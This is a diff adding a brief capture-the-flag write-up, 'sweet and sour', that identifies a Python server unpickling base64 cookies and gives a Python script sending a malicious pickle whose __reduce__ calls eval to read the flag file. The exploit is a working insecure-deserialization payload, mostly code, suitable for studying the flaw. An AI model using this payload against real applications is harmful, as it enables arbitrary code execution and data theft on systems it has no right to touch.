@@ -1,0 +1,31 @@
+sweet and sour
+
+curl -I url
+From header we can obtain, that it is python server and set-cookie is shown right there
+
+echo -n "cookievalue" | base64 -d
+After decoding the cookie, we obtain the message "Try harder" and some junk data. 
+Based on what information we have gathered until now ( Python server, cookies in base64 
+format + some junk ) we can conclude that this is a pickle server.
+
+At this moment we can send some pickle payloads to the server which will lead to 
+arbitrary file read vulnerability. 
+
+Unpickling the pickled byte stream allows you to recreate the original object hierarchy
+
+
+code:
+
+import pickle
+import base64
+import requests
+
+class Exploit(object):
+        def __reduce__(self):
+                return eval, ("open('flag','r').read()",)
+def sendPayload(p):
+        print(base64.urlsafe_b64encode(p))
+        headers={"Cookie":"data="+base64.urlsafe_b64encode(p).decode()}
+        t=requests.get("url/dashboard",headers=headers)
+        print(t.text)
+sendPayload(pickle.dumps(Exploit(),protocol=2))
